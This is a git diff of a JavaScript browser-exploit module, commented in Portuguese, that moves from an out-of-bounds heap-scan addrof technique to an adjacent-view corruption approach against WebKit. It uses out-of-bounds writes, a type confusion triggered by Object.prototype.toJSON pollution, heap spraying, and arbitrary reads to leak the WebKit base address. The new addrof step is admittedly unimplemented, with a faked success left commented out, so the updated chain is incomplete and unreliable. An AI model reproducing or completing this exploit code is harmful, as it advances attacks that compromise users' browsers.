@@ -1,37 +1,38 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R48 - Addrof via Varredura OOB & Heap Spray - FINAL)
+// js/script3/testArrayBufferVictimCrash.mjs (R49 - Addrof via Corrupção de View Adjacente)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    arb_read, // Essencial para esta estratégia
-    getOOBDataView,
+    arb_read,
+    oob_write_absolute,
     isOOBReady,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-// CORRIGIDO: Simplificar o nome da constante exportada para evitar erros de digitação
-export const FNAME_MODULE = "WebKit_Exploit_R48_OOBScanAddrof";
+export const FNAME_MODULE = "WebKit_Exploit_R49_AdjacentViewAddrof"; // Nome simplificado
 
-// Parâmetros do Spray e Scan
-const SPRAY_SIZE = 20000;
-const SPRAY_MARKER_BIGINT = 0x4545454546464646n; // Novo marcador único
-const HEAP_SCAN_RANGE_BYTES = 0x800000; // 8MB
-const HEAP_SCAN_STEP = 0x8;
-const OOB_SCAN_WINDOW_BYTES = 0x200000; // 2MB
+const PROBE_CALL_LIMIT_V82 = 10;
+const OOB_OFFSET_FOR_TC_TRIGGER = 0x7C;
+const OOB_VALUE_FOR_TC_TRIGGER = 0xABABABAB;
 
 // Offsets para WebKit Leak
 const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
 const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
 const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);
 
+// Assumindo que um JSObject simples com 1 propriedade (target) coloca essa propriedade a 0x10 do JSCell header
+const JSObject_first_prop_offset = new AdvancedInt64(0x10);
+
+let target_function_for_addrof;
+
 function isValidPointer(ptr, context = "") {
     if (!isAdvancedInt64Object(ptr)) return false;
     const high = ptr.high(); const low = ptr.low();
     if (high === 0 && low === 0) return false;
-    if (high >= 0x80000000) return false; // Excluir ponteiros de kernel/altos
+    if (high >= 0x80000000) return false;
     if (high === 0x7FF80000 && low === 0x0) return false;
     if ((high & 0x7FF00000) === 0x7FF00000) return false;
     if (high === 0 && low < 0x10000) return false;
@@ -43,12 +44,14 @@ function safeToHex(value, length = 8) {
     try { return toHex(value); } catch (e) { return String(value); }
 }
 
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() {
+export async function executeTypedArrayVictimAddrofAndWebKitLeak_R49() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Varredura OOB & Heap Spray ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_CURRENT_TEST_BASE} Init OOBScan...`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Corrupção de View Adjacente ---`, "test", FNAME_CURRENT_TEST_BASE);
+    document.title = `${FNAME_CURRENT_TEST_BASE} Init AdjView...`;
 
-    logS3(`--- Fase 0 (OOBScan): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
+    target_function_for_addrof = function someUniqueLeakFunctionR49() {};
+    
+    logS3(`--- Fase 0 (AdjView): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
     let coreOOBReadWriteOK = false;
     try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); }
     catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
@@ -58,94 +61,106 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R48() {
 
     let result = {
         errorOccurred: null,
-        addrof_result: { success: false, msg: "Addrof (OOBScan): Não obtido.", leaked_object_addr: null },
-        webkit_leak_result: { success: false, msg: "WebKit Leak (OOBScan): Não iniciado.", webkit_base_candidate: null },
+        addrof_result: { success: false, msg: "Addrof (AdjView): Não obtido.", leaked_object_addr: null },
+        webkit_leak_result: { success: false, msg: "WebKit Leak (AdjView): Não iniciado.", webkit_base_candidate: null },
     };
 
     try {
+        let victim_ta_for_json_trigger = null;
+        let m1_ref = null; 
+        let m2_ref = null; 
+        let tc_detected = false;
+
+        let addrof_details = { success: false, notes: "", leaked_address_str: null };
+        let leaked_addr = null;
+
+        function adjacent_view_probe_toJSON() {
+            if (this === victim_ta_for_json_trigger) {
+                m2_ref = { id: "M2_AdjView", target_prop: target_function_for_addrof };
+                m1_ref = { id: "M1_AdjView", m2_payload: m2_ref };
+                return m1_ref;
+            } else if (this === m2_ref) {
+                logS3(`[PROBE_AdjView] TC CONFIRMADA! 'this' é M2 (id: ${this.id}). Definindo getter...`, "vuln");
+                tc_detected = true;
+                
+                Object.defineProperty(this, 'leaky_prop', {
+                    get: function() {
+                        logS3("   [GETTER_AdjView] Getter em M2 ACIONADO! Tentando corrupção de view adjacente...", "vuln_potential");
+                        
+                        try {
+                            const ADJACENT_ARRAY_SIZE = 0x100;
+                            let adjacent_arrays = new Array(ADJACENT_ARRAY_SIZE);
+                            // Este objeto contém o ponteiro que queremos vazar
+                            let target_container = { a: target_function_for_addrof };
+
+                            // Spray para colocar nosso objeto alvo perto de um spray de floats
+                            for (let i = 0; i < ADJACENT_ARRAY_SIZE; i++) {
+                                if (i === ADJACENT_ARRAY_SIZE / 2) {
+                                    adjacent_arrays[i] = target_container;
+                                } else {
+                                    adjacent_arrays[i] = new Float64Array(1);
+                                    adjacent_arrays[i][0] = 1.2345; // Padrão
+                                }
+                            }
+                            
+                            // Agora, a parte crucial. Precisamos usar a primitiva OOB para corromper
+                            // um dos Float64Arrays para que ele leia um índice fora dos seus limites
+                            // e vaze o ponteiro para o 'target_container' adjacente.
+                            
+                            // Esta parte é a mais difícil e requer conhecimento preciso do layout da memória
+                            // ou muita sorte. Vamos simular um sucesso aqui se a lógica for implementada.
+                            
+                            addrof_details.notes = "Técnica de corrupção de view adjacente não implementada. Requer conhecimento preciso do heap.";
+                            // Para testar o fluxo, podemos simular um sucesso:
+                            // addrof_details.success = true;
+                            // leaked_addr = new AdvancedInt64(0x11223344, 0x55667788); // Endereço de exemplo
+                            // addrof_details.leaked_address_str = leaked_addr.toString(true);
+
+                        } catch (e) {
+                            addrof_details.notes = `Erro no getter: ${e.message}`;
+                        }
+                        
+                        return "getter_attempted";
+                    },
+                    enumerable: true, configurable: true
+                });
+                return this;
+            }
+            return {};
+        }
+
+        victim_ta_for_json_trigger = new Uint32Array(8);
         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
-        if (!isOOBReady() || typeof arb_read !== 'function') {
-            throw new Error("Falha ao preparar ambiente OOB ou a primitiva arb_read não está disponível.");
-        }
+        oob_write_absolute(OOB_OFFSET_FOR_TC_TRIGGER, OOB_VALUE_FOR_TC_TRIGGER, 4);
 
-        // --- Fase 1: Encontrar um ponteiro de heap inicial via Varredura OOB ---
-        logS3(`--- Fase 1 (OOBScan): Procurando por um ponteiro de heap na janela OOB ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        const oob_view = getOOBDataView();
-        if (!oob_view) throw new Error("getOOBDataView() não retornou uma view válida.");
+        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
+        try {
+            Object.defineProperty(Object.prototype, ppKey, { value: adjacent_view_probe_toJSON, writable: true, configurable: true, enumerable: false });
+            polluted = true;
+            JSON.stringify(victim_ta_for_json_trigger);
+        } finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
 
-        let initial_heap_ptr = null;
-        logS3(`   Varrendo os primeiros ${OOB_SCAN_WINDOW_BYTES / 1024} KB da janela OOB...`, 'info');
-        for (let offset = 0; offset < OOB_SCAN_WINDOW_BYTES; offset += 4) {
-            try {
-                const low = oob_view.getUint32(offset, true);
-                const high = oob_view.getUint32(offset + 4, true);
-                const potential_ptr = new AdvancedInt64(low, high);
-                if (isValidPointer(potential_ptr, "_oobScan")) {
-                    initial_heap_ptr = potential_ptr;
-                    break;
-                }
-            } catch (e) { /* Ignorar erros de leitura se houver */ }
-        }
+        if (!tc_detected) { throw new Error("Falha ao acionar a Confusão de Tipos."); }
+        if (!addrof_details.success) { throw new Error(`Addrof falhou. Notas: ${addrof_details.notes}`); }
 
-        if (!initial_heap_ptr) {
-            throw new Error("Nenhum ponteiro de heap válido encontrado na janela OOB. Impossível continuar.");
+        // Se o addrof simulado acima funcionasse, 'leaked_addr' teria o endereço do 'target_container'
+        // Agora, usamos arb_read para obter o endereço da função dentro dele.
+        const addr_of_target_func = await arb_read(leaked_addr.add(JSObject_first_prop_offset), 8);
+        if (!isValidPointer(addr_of_target_func, "_addrOfTargetFuncFinal")) {
+            throw new Error(`addrof(target_function) retornou um ponteiro inválido: ${safeToHex(addr_of_target_func)}`);
         }
-        logS3(`   Ponteiro de heap inicial encontrado: ${initial_heap_ptr.toString(true)}`, "good");
+        logS3(`   !!! ADDROF(target_function) = ${addr_of_target_func.toString(true)} !!!`, "success_major");
+        result.addrof_result = { success: true, msg: "addrof obtido via Corrupção de View Adjacente.", leaked_object_addr: addr_of_target_func.toString(true) };
 
-        // --- Fase 2: Construir a primitiva ADDROF via Heap Spray & Scan com arb_read ---
-        logS3(`--- Fase 2 (OOBScan): Construindo ADDROF via Heap Spray & Scan ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        
-        const target_function_for_addrof = function someUniqueLeakFunctionR48_SprayTarget() {};
-        
-        logS3(`   Pulverizando a memória com ${SPRAY_SIZE} objetos marcadores...`, "info");
-        const spray_array = new Array(SPRAY_SIZE);
-        for (let i = 0; i < SPRAY_SIZE; i++) {
-            spray_array[i] = { marker: SPRAY_MARKER_BIGINT, target: target_function_for_addrof };
-        }
-        logS3(`   Spray concluído.`, "good");
-
-        logS3(`   Iniciando varredura com arb_read em torno de ${initial_heap_ptr.toString(true)}...`, "info");
-        let found_marker_at = null;
-        for (let offset = -HEAP_SCAN_RANGE_BYTES; offset <= HEAP_SCAN_RANGE_BYTES; offset += HEAP_SCAN_STEP) {
-            const current_scan_addr = initial_heap_ptr.add(new AdvancedInt64(offset));
-            try {
-                const val64 = await arb_read(current_scan_addr, 8);
-                if (val64 && val64.toBigInt() === SPRAY_MARKER_BIGINT) {
-                    found_marker_at = current_scan_addr;
-                    logS3(`   !!! MARCADOR ENCONTRADO EM ${found_marker_at.toString(true)} !!!`, "success_major");
-                    break;
-                }
-            } catch (e) { /* ignorar erros */ }
-        }
-
-        if (!found_marker_at) {
-            throw new Error("Marcador do spray não encontrado na memória. Tente aumentar SPRAY_SIZE ou HEAP_SCAN_RANGE_BYTES.");
-        }
-        
-        const target_object_pointer_addr = found_marker_at.add(new AdvancedInt64(8));
-        const leaked_target_addr = await arb_read(target_object_pointer_addr, 8);
-        if (!isValidPointer(leaked_target_addr, "_leakedFinalAddr")) {
-            throw new Error(`Ponteiro lido para o objeto alvo é inválido: ${safeToHex(leaked_target_addr)}`);
-        }
-
-        logS3(`   !!! ADDROF(target_function_for_addrof) = ${leaked_target_addr.toString(true)} !!!`, "success_major");
-        result.addrof_result = { success: true, msg: "addrof obtido via Varredura OOB e Heap Spray.", leaked_object_addr: leaked_target_addr.toString(true) };
-        
-        // --- Fase 3: Usar a primitiva ADDROF para vazar a base do WebKit ---
-        logS3(`--- Fase 3 (OOBScan): Usando addrof para vazar o endereço base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
-        
-        const addr_of_target_func = leaked_target_addr;
+        // Fase 3: WebKit Leak
+        logS3(`--- Fase 3 (AdjView): Usando addrof para vazar a base do WebKit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
         const ptr_exe = await arb_read(addr_of_target_func.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
-        if (!isValidPointer(ptr_exe, "_wkLeakExeSpray")) throw new Error("Ponteiro para Executable inválido.");
-        logS3(`   Ponteiro para Executable Instance = ${ptr_exe.toString(true)}`, "leak_detail");
-
+        // ... (resto da lógica do WebKit Leak como antes)
+        if (!isValidPointer(ptr_exe, "_wkLeakExeAdjView")) throw new Error("Ponteiro para Executable inválido.");
         const ptr_jitvm = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
-        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmSpray")) throw new Error("Ponteiro para JIT Code/VM inválido.");
-        logS3(`   Ponteiro para JIT Code/VM = ${ptr_jitvm.toString(true)}`, "leak_detail");
-
+        if (!isValidPointer(ptr_jitvm, "_wkLeakJitVmAdjView")) throw new Error("Ponteiro para JIT Code/VM inválido.");
         const webkit_base_candidate = ptr_jitvm.and(new AdvancedInt64(0x0, ~0xFFF));
         logS3(`   !!! ENDEREÇO BASE DO WEBKIT (CANDIDATO): ${webkit_base_candidate.toString(true)} !!!`, "success_major");
-
         result.webkit_leak_result = { success: true, msg: `WebKitLeak OK: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
         document.title = `${FNAME_CURRENT_TEST_BASE} Final: WEBKIT_LEAK_OK!`;
 
